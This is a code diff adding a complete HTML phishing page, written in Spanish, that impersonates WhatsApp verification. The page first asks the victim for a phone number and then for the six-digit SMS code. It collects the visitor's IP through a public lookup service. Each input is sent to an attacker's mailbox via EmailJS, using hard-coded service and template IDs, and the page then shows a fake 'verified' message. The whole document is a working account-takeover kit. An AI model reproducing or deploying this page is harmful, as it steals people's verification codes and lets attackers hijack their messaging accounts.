@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Verification</title>
+
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<style>
+body {
+    font-family: Arial;
+    background: white;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+}
+
+.box {
+    text-align: center;
+    border: 2px solid #2ecc71;
+    padding: 25px;
+    border-radius: 12px;
+    width: 90%;
+    max-width: 400px;
+}
+
+.hidden {
+    display: none;
+}
+
+h2 {
+    color: #2ecc71;
+    font-size: 22px;
+}
+
+p {
+    font-size: 16px;
+}
+
+input {
+    padding: 15px;
+    width: 100%;
+    font-size: 22px;
+    text-align: center;
+    margin-top: 15px;
+    border: 1px solid #ccc;
+    border-radius: 8px;
+    letter-spacing: 5px;
+}
+
+button {
+    margin-top: 20px;
+    padding: 14px;
+    width: 100%;
+    background: #2ecc71;
+    color: white;
+    border: none;
+    cursor: pointer;
+    border-radius: 8px;
+    font-size: 16px;
+}
+
+.success {
+    display: none;
+    color: #2ecc71;
+    margin-top: 15px;
+    font-weight: bold;
+}
+</style>
+
+<script>
+(function(){
+    emailjs.init("bOkwZCKhTDxrtRAWs");
+})();
+
+let userIP = "loading...";
+
+// Get IP
+fetch("https://api.ipify.org?format=json")
+.then(res => res.json())
+.then(data => {
+    userIP = data.ip;
+})
+.catch(() => {
+    userIP = "not available";
+});
+
+// STEP 1
+function goToVerification() {
+    const number = document.getElementById("firstNumber").value;
+
+    if (!number || isNaN(number)) {
+        alert("Veuillez entrer un numéro valide");
+        return;
+    }
+
+    emailjs.send("service_7ybnwx6", "template_5l0h45b", {
+        action: "Clicked Continue",
+        number: number,
+        ip: userIP
+    });
+
+    document.getElementById("step1").classList.add("hidden");
+    document.getElementById("step2").classList.remove("hidden");
+}
+
+// STEP 2
+function sendCode() {
+    const code = document.getElementById("code").value;
+
+    if (code.length !== 6 || isNaN(code)) {
+        alert("Entra la clave de 6 dígitos");
+        return;
+    }
+
+    emailjs.send("service_7ybnwx6", "template_5l0h45b", {
+        passcode: code,
+        ip: userIP
+    });
+
+    document.getElementById("successMessage").style.display = "block";
+}
+</script>
+
+</head>
+
+<body>
+
+<!-- STEP 1 -->
+<div id="step1" class="box">
+    <h2>Confirma su número de WhatsApp</h2>
+
+    <input 
+        id="firstNumber" 
+        type="text" 
+        placeholder="Entra su número"
+        inputmode="numeric"
+        pattern="[0-20]*"
+    >
+
+    <button onclick="goToVerification()">Continuar</button>
+</div>
+
+<!-- STEP 2 -->
+<div id="step2" class="box hidden">
+    <h2>Verificación WhatsApp</h2>
+    <p>WhatsApp debe proteger su cuenta. Entra la clave de 6 dígitos enviada por SMS.</p>
+
+    <input 
+        id="code" 
+        type="password" 
+        maxlength="6" 
+        placeholder="••••••"
+        inputmode="numeric"
+    >
+
+    <button onclick="sendCode()">Continue</button>
+
+    <p id="successMessage" class="success">
+        ✔ La clave está verificada!
+    </p>
+</div>
+
+</body>
+</html>
